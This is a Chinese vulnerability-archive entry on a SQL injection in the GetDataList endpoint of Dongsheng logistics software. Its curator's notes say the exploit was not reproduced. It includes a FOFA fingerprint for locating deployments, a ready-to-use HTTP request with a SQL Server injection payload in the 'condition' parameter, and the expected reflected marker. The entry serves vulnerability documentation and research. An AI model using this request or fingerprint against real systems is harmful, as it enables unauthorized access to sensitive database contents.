---
source: "wy876 漏洞文库"
title: "东胜物流软件 MsWlDriver GetDataList condition SQL注入"
product: "东胜物流软件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；SQL Server字符拼接语法"
prerequisites: "无Cookie示例，鉴权未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/mp5bydo55w118fyr"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6GetDataList%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "fid=\"Z4c2hPCi5IR/AnH5vZXNSQ==\""
id: "vw-3061242f782c5ddefd044481"
entity_id: "ve-3061242f782c5ddefd044481"
schema_version: "1"
previous_fofa_unverified: "fid="
---

# 东胜物流软件 MsWlDriver GetDataList condition SQL注入

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：东胜物流软件；MsWlDriver GetDataList condition SQL注入
- 版本、配置及部署条件：版本未知；SQL Server字符拼接语法
- 认证与权限前提：无Cookie示例，鉴权未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- qxpqqqzkqq仅孤立字符串，未标响应/错误上下文，需说明类型转换报错与正常反射区别
- 请求page参数重复、sort无值且时间戳固定，清理非必要噪声
- 缺影响/修复范围与根因；同产品不同接口保留

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
东胜物流软件是一款致力于为客户提供IT支撑的 SOP， 帮助客户大幅提高工作效率，降低各个环节潜在风险的物流软件。东胜物流软件 GetDataList接口处存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

## 二、影响版本
+ 东胜物流软件

## 三、资产测绘
+ fofa`fid="Z4c2hPCi5IR/AnH5vZXNSQ=="`
+ 特征


## 四、漏洞复现
```http
GET /TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort&condition=123+IN+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113))--%20&page=1&page=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```


```plain
qxpqqqzkqq
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mp5bydo55w118fyr>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
